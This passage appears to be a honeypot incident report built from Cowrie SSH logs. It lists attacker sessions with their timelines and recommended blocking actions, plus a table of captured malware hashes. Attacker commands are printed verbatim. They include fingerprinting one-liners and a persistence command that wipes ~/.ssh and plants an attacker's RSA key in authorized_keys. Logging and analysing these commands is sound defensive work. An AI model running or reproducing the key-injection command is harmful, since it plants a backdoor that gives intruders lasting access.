| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:51:48` | `cowrie.session.connect` |
| `2026-08-02 04:51:48` | `cowrie.client.version` |
| `2026-08-02 04:51:49` | `cowrie.client.kex` |
| `2026-08-02 04:51:49` | `cowrie.login.success` |
| `2026-08-02 04:51:50` | `cowrie.session.params` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.success` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.command.input` |
| `2026-08-02 04:51:50` | `cowrie.log.closed` |
| `2026-08-02 04:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7822bffc6bf3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-02 04:52 |
| **Last Seen** | 2026-08-02 04:52 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:52:29` | `cowrie.session.connect` |
| `2026-08-02 04:52:31` | `cowrie.client.version` |
| `2026-08-02 04:52:31` | `cowrie.client.kex` |
| `2026-08-02 04:52:43` | `cowrie.login.success` |
| `2026-08-02 04:52:50` | `cowrie.session.params` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.success` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:50` | `cowrie.command.input` |
| `2026-08-02 04:52:53` | `cowrie.log.closed` |
| `2026-08-02 04:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d036845d0c00

| Field | Detail |
|---|---|
| **Source IP** | `49.206.201[.]253` |
| **First Seen** | 2026-08-02 04:53 |
| **Last Seen** | 2026-08-02 04:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:53:07` | `cowrie.session.connect` |
| `2026-08-02 04:53:08` | `cowrie.client.version` |
| `2026-08-02 04:53:08` | `cowrie.client.kex` |
| `2026-08-02 04:53:09` | `cowrie.login.success` |
| `2026-08-02 04:53:10` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7072aec7b2

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-08-02 04:53 |
| **Last Seen** | 2026-08-02 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:53:15` | `cowrie.session.connect` |
| `2026-08-02 04:53:15` | `cowrie.client.version` |
| `2026-08-02 04:53:15` | `cowrie.client.kex` |
| `2026-08-02 04:53:16` | `cowrie.login.success` |
| `2026-08-02 04:53:16` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e5d7767387

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-08-02 04:53 |
| **Last Seen** | 2026-08-02 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:53:21` | `cowrie.session.connect` |
| `2026-08-02 04:53:21` | `cowrie.client.version` |
| `2026-08-02 04:53:21` | `cowrie.client.kex` |
| `2026-08-02 04:53:22` | `cowrie.login.success` |
| `2026-08-02 04:53:22` | `cowrie.session.params` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.success` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.command.input` |
| `2026-08-02 04:53:22` | `cowrie.log.closed` |
| `2026-08-02 04:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e1da8c4eb52

| Field | Detail |
|---|---|
| **Source IP** | `80.233.12[.]109` |
| **First Seen** | 2026-08-02 04:53 |
| **Last Seen** | 2026-08-02 04:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:53:27` | `cowrie.session.connect` |
| `2026-08-02 04:53:27` | `cowrie.client.version` |
| `2026-08-02 04:53:27` | `cowrie.client.kex` |
| `2026-08-02 04:53:28` | `cowrie.login.success` |
| `2026-08-02 04:53:29` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.12[.]109` to AbuseIPDB if not already reported
- [ ] Block `80.233.12[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c35ba12655c3

| Field | Detail |
|---|---|
| **Source IP** | `112.28.73[.]142` |
| **First Seen** | 2026-08-02 04:53 |
| **Last Seen** | 2026-08-02 04:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:53:34` | `cowrie.session.connect` |
| `2026-08-02 04:53:36` | `cowrie.client.version` |
| `2026-08-02 04:53:36` | `cowrie.client.kex` |
| `2026-08-02 04:53:38` | `cowrie.login.success` |
| `2026-08-02 04:53:41` | `cowrie.direct-tcpip.request` |
| `2026-08-02 04:53:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.28.73[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.28.73[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57f6849eec2f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]177` |
| **First Seen** | 2026-08-02 04:54 |
| **Last Seen** | 2026-08-02 04:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:54:09` | `cowrie.session.connect` |
| `2026-08-02 04:54:09` | `cowrie.client.version` |
| `2026-08-02 04:54:09` | `cowrie.client.kex` |
| `2026-08-02 04:54:10` | `cowrie.login.success` |
| `2026-08-02 04:54:10` | `cowrie.session.params` |
| `2026-08-02 04:54:10` | `cowrie.command.input` |
| `2026-08-02 04:54:10` | `cowrie.command.failed` |
| `2026-08-02 04:54:11` | `cowrie.log.closed` |
| `2026-08-02 04:54:11` | `cowrie.session.params` |
| `2026-08-02 04:54:11` | `cowrie.command.input` |
| `2026-08-02 04:54:12` | `cowrie.session.file_download` |
| `2026-08-02 04:54:12` | `cowrie.log.closed` |
| `2026-08-02 04:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]177` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-441d252a924b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]177` |
| **First Seen** | 2026-08-02 04:54 |
| **Last Seen** | 2026-08-02 04:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:54:12` | `cowrie.session.connect` |
| `2026-08-02 04:54:12` | `cowrie.client.version` |
| `2026-08-02 04:54:12` | `cowrie.client.kex` |
| `2026-08-02 04:54:12` | `cowrie.login.success` |
| `2026-08-02 04:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]177` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5236c7e6fb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.189[.]177` |
| **First Seen** | 2026-08-02 04:54 |
| **Last Seen** | 2026-08-02 04:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-02 04:54:12` | `cowrie.session.connect` |
| `2026-08-02 04:54:12` | `cowrie.client.version` |
| `2026-08-02 04:54:12` | `cowrie.client.kex` |
| `2026-08-02 04:54:13` | `cowrie.login.success` |
| `2026-08-02 04:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.189[.]177` to AbuseIPDB if not already reported
- [ ] Block `209.99.189[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.53.205[.]84` | **30** | 2026-08-02 03:48 | 2026-08-02 03:49 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `34.78.156[.]244` | **30** | 2026-08-02 03:12 | 2026-08-02 03:12 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `91.233.83[.]203` | **5** | 2026-08-02 03:19 | 2026-08-02 04:50 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-02 03:18 | 2026-08-02 04:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `156.229.16[.]142` | **4** | 2026-08-02 03:17 | 2026-08-02 03:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.240.219[.]146` | **4** | 2026-08-02 03:42 | 2026-08-02 03:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-02 03:59 | 2026-08-02 03:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | **3** | 2026-08-02 04:03 | 2026-08-02 04:55 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-08-02 03:41 | 2026-08-02 03:41 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-08-02 03:20 | 2026-08-02 03:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-02 03:08 | 2026-08-02 04:10 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-08-02 03:17 | 2026-08-02 03:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `112.26.99[.]93` | 1 | 2026-08-02 02:58 | 2026-08-02 02:58 | 1s | 0 | `T1592` | 🟢 LOW |
| `115.84.178[.]56` | 1 | 2026-08-02 03:39 | 2026-08-02 03:39 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.153.253[.]76` | 1 | 2026-08-02 04:25 | 2026-08-02 04:25 | 1s | 0 | `T1592` | 🟢 LOW |
| `174.75.211[.]217` | 1 | 2026-08-02 03:17 | 2026-08-02 03:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]4` | 1 | 2026-08-02 03:07 | 2026-08-02 03:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.75.51[.]71` | 1 | 2026-08-02 04:04 | 2026-08-02 04:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.176.29[.]10` | 1 | 2026-08-02 03:07 | 2026-08-02 03:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]42` | 1 | 2026-08-02 03:02 | 2026-08-02 03:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-08-02 03:12 | 2026-08-02 03:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.22.223[.]20` | 1 | 2026-08-02 03:43 | 2026-08-02 03:43 | 30s | 0 | `T1592` | 🟢 LOW |
| `213.104.97[.]66` | 1 | 2026-08-02 03:18 | 2026-08-02 03:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.134.84[.]214` | 1 | 2026-08-02 03:09 | 2026-08-02 03:10 | 16s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-08-02 04:09 | 2026-08-02 04:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-08-02 04:52 | 2026-08-02 04:52 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]2` | 1 | 2026-08-02 03:11 | 2026-08-02 03:11 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]236` | 1 | 2026-08-02 04:46 | 2026-08-02 04:46 | 16s | 0 | `T1592` | 🟢 LOW |
| `93.170.42[.]137` | 1 | 2026-08-02 04:26 | 2026-08-02 04:26 | 14s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
